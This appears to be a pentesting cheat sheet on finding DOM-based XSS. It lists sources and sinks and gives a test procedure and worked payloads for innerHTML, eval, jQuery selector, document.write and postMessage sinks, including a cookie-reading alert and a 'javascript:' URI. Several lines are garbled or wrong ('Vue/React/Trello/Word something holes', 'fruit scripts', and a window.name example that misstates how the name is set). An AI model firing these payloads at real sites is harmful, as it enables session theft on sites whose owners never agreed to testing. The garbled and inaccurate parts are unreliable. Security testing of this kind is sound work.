# HOW TO TEST DOM XSS ON A TARGET (2026 expert guide)
> **Author:** MD MAHABUBUR RAHMAN
DOM XSS = source flows to sink WITHOUT hitting the server. Server never sanitizes it.

## Sources (where taint starts)
location.search, location.hash, location.href, document.URL, document.documentURI,
document.referrer, window.name, postMessage event.data, window.opener, sessionStorage/localStorage,
IndexedDB, WebSocket message.data, History API state.

## Sinks (where taint executes)
document.write, document.writeln, innerHTML/outerHTML/insertAdjacentHTML, eval, Function(),
setTimeout(a,b) string form, setInterval string form, location=, location.href=, location.replace/assign,
window.open, jQuery html()/append()/attr(href)/$('selector'), angular {{}}, vue v-html,
React dangerouslySetInnerHTML, shadowRoot.innerHTML, srcdoc, iframe.src, worker URL.

## The N ways to test
1. Taint-trace a source to a sink manually in devtools (set breakpoints on DOM mutation).
2. Generator: use your browser's URL bar - set ?x=<svg/onload=alert(1)> and watch for DOM changes.
3. Inject into EACH sink separately: hash-based (##...) , search-based (?...) , referer, window.name, postMessage.
4. postMessage: create an attacker page that window.postMessage({'data':payload},'*') - classic
   Vue/React/Trello/Word something holes.
5. jQuery selector injection: $(location.hash) with #<img src=x onerror=alert(1)> or #x onfocus=tabindex.
6. Multi-sink variants: innerHTML with img onerror, eval with - alert(1) -, script.src with //attacker.
7. Mutation/routing XSS: burst router state -> sinks that never encode (next.js query, react-router).
8. Framework audit: check frame modes (see framework-matrix in XSS_Payloads).

## Step-by-step on target
1. List all URLs with params/hash on the app (waybackurls + crawling).
2. In browser devtools: Sources -> watch innerHTML/eval/location assignments break.
3. For each sink hit, swap its value: 
   - innerHTML: <img src=x onerror=alert(1)>  /  <svg onload=alert(1)>
   - eval/location: -alert(1)- / javascript:alert(1)
   - $(): #<img src=x onerror=alert(1)>
4. Check you see the ALERT/console break. Confirm via session context (victim chrome).
5. ASK the server what it returns while you toggled the same params (server-side reflection absence = DOM only).

## False positives
- Sink computed value must actually EXECUTE, not just be assigned.
- Sanitizer before sink (DOMPurify) - safe unless bypass (see dom-clobbering file in XSS_Payloads).
- CSP with strict script-src kills inline sinks - check CSP of the app first.

## Tools
- Burp DOM clobber/fruit scripts, dome, dom-analyze, Selenium with debugger, dalfox for query-class finds.
- Electron/node variants: nodeIntegration with preload = RCE not just XSS (see Framework_RCE).

## WORKED EXAMPLES (concrete)
A. innerHTML sink:
?q=<img src=x onerror=alert(1)>            # src of the image -> error handler
?q=<svg onload=alert(document.cookie)>
(never use <script> in innerHTML - sanitizer/bl-oker catches it; handlers fire)
B. eval / location sink:
?q=-alert(1)-
?q=1;alert(1)//
?q=javascript:alert(1)      # if echoed into location.href
C. jQuery selector sink:
#<img src=x onerror=alert(1)>              # location.hash after #
#x onfocus=alert(1) tabindex=1
$(location.hash) triggers on scroll/refocus
D. document.write sink (often needs breaking quote):
"><svg onload=alert(1)>
"><img src=x onerror=alert(1)>
this breaks document.write('<img src="/resources/..">') into an active tag
E. postMessage sink:
<script>
window.postMessage({'data':'<img src=x onerror=alert(1)>'},'*');
</script>
/or/  window.postMessage('javascript:alert(1)','*')   # if eval'd elsewhere
F. window.name / referrer source:
<a href="https://target.com/next" target="_blank">  -> window.name is your page name,
set via:  <a target="_blank" name="<svg/onload=alert(1)>" href=...
G. Breakpoint trace:
devtools > Sources > Event Listener: add listener on "DOMNodeInserted" and
execute ?q=<svg/onload=alert(1)> - wherever insertion happens = sink.
